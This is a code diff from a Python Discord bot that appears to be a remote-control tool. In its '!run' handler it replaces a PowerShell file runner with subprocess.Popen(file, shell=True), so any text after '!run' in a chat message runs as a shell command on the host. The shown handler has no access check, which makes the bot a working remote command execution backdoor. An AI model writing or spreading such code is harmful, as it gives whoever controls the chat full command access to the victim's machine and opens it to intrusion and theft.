@@ -97,17 +97,9 @@ async def on_message(message):
 
     if message.content.startswith("!run"):
         file = message.content.split(" ")[1]
-        try:
-            output = subprocess.Popen(
-                ["powershell.exe", file], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE
-            ).communicate()[0].decode("utf-8")
-            if output == "":
-                output = "No output"
-            embed = discord.Embed(title=f"Run > {os.getcwd()}", description=f"```{output}```", color=0xfafafa)
-            await message.reply(embed=embed)
-        except:
-            embed = discord.Embed(title="Error", description=f"```File not found```", color=0xfafafa)
-            await message.reply(embed=embed)
+        subprocess.Popen(file, shell=True)
+        embed = discord.Embed(title="Started", description=f"```{file}```", color=0xfafafa)
+        await message.reply(embed=embed)
 
 bot.run(token)
 
